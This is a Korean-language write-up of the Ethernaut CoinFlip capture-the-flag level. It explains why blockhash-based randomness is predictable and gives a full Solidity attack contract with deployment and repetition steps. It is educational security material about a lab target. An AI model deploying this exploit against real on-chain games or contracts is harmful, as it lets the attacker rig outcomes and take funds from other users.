# Ethernaut Level 3 - CoinFlip

## 문제 설명

CoinFlip 컨트랙트는 동전 던지기 게임을 구현하고 있으며,
연속으로 10번 맞추면 클리어되는 구조이다.

하지만 난수 생성 방식에 취약점이 존재하여 결과를 예측할 수 있다.

---

## 컨트랙트 분석

```solidity
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 5789604461865809...;

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

---

## 취약점 분석

### 1. 랜덤 값 생성 방식

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
```

이 값은:

- 이미 생성된 블록의 해시
- 누구나 접근 가능한 값
- 예측 가능

---

### 2. 결과 계산 방식

```solidity
uint256 coinFlip = blockValue / FACTOR;
```

`FACTOR ≈ 2^255` 이므로:

→ blockhash의 **최상위 1비트만 사용**

결과는 단순히:

* 1 → true
* 0 → false

---

### 3. 공격 가능성

공격자는 동일한 계산을 수행하여
컨트랙트가 어떤 값을 선택할지 미리 알 수 있다.

---

### 4. lastHash 체크

```solidity
if (lastHash == blockValue) {
    revert();
}
```

→ 같은 블록에서 두 번 호출 방지

하지만 블록마다 1번씩 호출하면 문제 없음

---

## 공격 전략

1. 이전 블록 해시를 읽는다
2. 동일한 계산 수행
3. 결과를 `_guess`로 전달
4. 매 블록마다 반복하여 10연승 달성

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttack {
    ICoinFlip public target;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = (coinFlip == 1);

        return target.flip(guess);
    }

    function getWins() public view returns (uint256) {
        return target.consecutiveWins();
    }
}
```

---

## 공격 단계

### Step 1 — Remix 접속 및 컨트랙트 작성

Remix IDE에서 공격 컨트랙트를 작성하고 컴파일한다.

---

### Step 2 — 컨트랙트 배포

- Environment: Injected Provider (MetaMask)
- 네트워크: Ethernaut와 동일 (Sepolia 등)
- 생성자에 CoinFlip 인스턴스 주소 입력

---

### Step 3 — attack 실행

```solidity
attack()
```

→ 1회 성공

---

### Step 4 — 연속 실행

같은 블록에서 호출하면 revert 되므로 반드시:

```text
attack()
→ 몇 초 대기 (새 블록 생성)
→ attack()
→ 반복
```

---

### Step 5 — 상태 확인

```solidity
getWins()
```

→ 1 → 2 → 3 → ... → 10

---

